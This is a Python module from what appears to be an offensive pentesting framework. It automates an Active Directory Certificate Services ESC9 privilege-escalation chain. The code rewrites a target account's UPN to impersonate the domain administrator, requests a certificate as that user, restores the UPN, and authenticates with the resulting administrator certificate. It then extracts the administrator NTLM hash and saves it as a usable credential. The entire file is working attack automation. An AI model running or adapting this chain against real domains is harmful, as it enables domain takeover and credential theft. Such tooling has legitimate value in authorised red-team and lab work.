import argparse
import os
import shutil
from pathlib import Path
from core.runner import run_module_by_name
from core.target import load_current_profile, target_set_cred, target_add_cred
from core.paths import get_chain_artifacts_dir


def run(args):
    G, R, C, Y, B, W = '\033[92m', '\033[91m', '\033[96m', '\033[93m', '\033[94m', '\033[0m'
    BOLD = '\033[1m'

    # --- LOAD PROFILE ---
    # --- LOAD PROFILE ---
    profile = load_current_profile()

    if isinstance(profile, tuple):
        data = profile[0]
    else:
        data = profile

    starting_user = data["creds"][data["current_cred"]]["user"]
        
    
   
    artifacts = get_chain_artifacts_dir(data["name"], "esc9")

    domain = data.get("domain")
    dc = data.get("ip")

    target_user = args.extra[0] if getattr(args, "extra", None) else "ca_operator"
    impersonate = f"administrator@{domain}"

    print(f"\n{B}┌──────────────────────────────────────────────────────────┐{W}")
    print(f"{B}│{W}  {BOLD}{C}CHAIN:{W} ADCS ESC9 UPN IMPERSONATION              {B}│{W}")
    print(f"{B}└──────────────────────────────────────────────────────────┘{W}")

    adcs = data.get("adcs", {})
    template = adcs.get("templates", [{}])[0].get("name")
    ca = adcs.get("ca")

    if not template or not ca:
        print("[-] Missing template/CA")
        return

    # -------------------------
    # STEP 1: UPN HIJACK
    # -------------------------
    print(f"\n{B}[*]{W} STEP 1: UPN HIJACK")

    run_module_by_name(
        "ad.updateupn",
        [target_user, impersonate],
        data
    )

    # -------------------------
    # STEP 2: SWITCH → CA_OPERATOR
    # -------------------------
    print(f"\n{B}[*]{W} STEP 2: SWITCH")

    real_user = resolve_user(data, target_user)
    if not real_user:
        print("[-] user not found")
        return

    target_set_cred(argparse.Namespace(identifier=real_user))

    # -------------------------
    # STEP 3: CERT REQUEST
    # -------------------------
    print(f"\n{B}[*]{W} STEP 3: CERT REQUEST")

    # get the actual CA_OPERATOR cred object
    ca_cred = None
    for c in data.get("creds", []):
        if c["user"].lower() == target_user.lower():
            ca_cred = c
            break

    if not ca_cred:
        print("[-] Failed to resolve CA_OPERATOR cred")
        return

    # force correct cred into module
    import modules.ad.certreq as certreq
    certreq.run(
        data,
        ca_cred,   
        argparse.Namespace(extra=[template, "--user", "administrator", "--ca", ca])
    )


    
    # -------------------------
    # STEP 4: REVERT UPN
    # -------------------------
    print(f"\n{B}[*]{W} STEP 4: REVERT UPN")

    run_module_by_name(
        "ad.updateupn",
        [target_user, f"{target_user}@{domain}"],
        data
    )


    # -------------------------
    # STEP 5: SWITCH BACK
    # -------------------------
    print(f"\n{B}[*]{W} STEP 5: RESTORE CONTEXT")

    target_set_cred(argparse.Namespace(identifier=starting_user))


    


    # -------------------------
    # STEP 6: AUTH
    # -------------------------
    print(f"\n{B}[*]{W} STEP 6: AUTH")

    pfx = Path("administrator.pfx")

    result = run_module_by_name(
        "ad.certauth",
        [str(pfx), "--username", "administrator"],
        data
    )

    # -------------------------
    # STEP 7 HASH EXTRACTION
    # -------------------------
    
    print(f"\n{B}[*]{W} STEP 7: HASH EXTRACTION")

    nt_hash = None

    if isinstance(result, list):
        for c in result:
            if c.get("type") == "ntlm":
                nt_hash = c["secret"]

    if nt_hash:
        target_add_cred(
            argparse.Namespace(
                user="administrator",
                password=None,
                hash=nt_hash,
                aes=None,
                ccache=None
            ),
            show=True,
            switch=True
        )

    print(f"\n{G}DONE{W}")


def resolve_user(data, name):
    for c in data.get("creds", []):
        if c["user"].lower() == name.lower():
            return c["user"]
    return None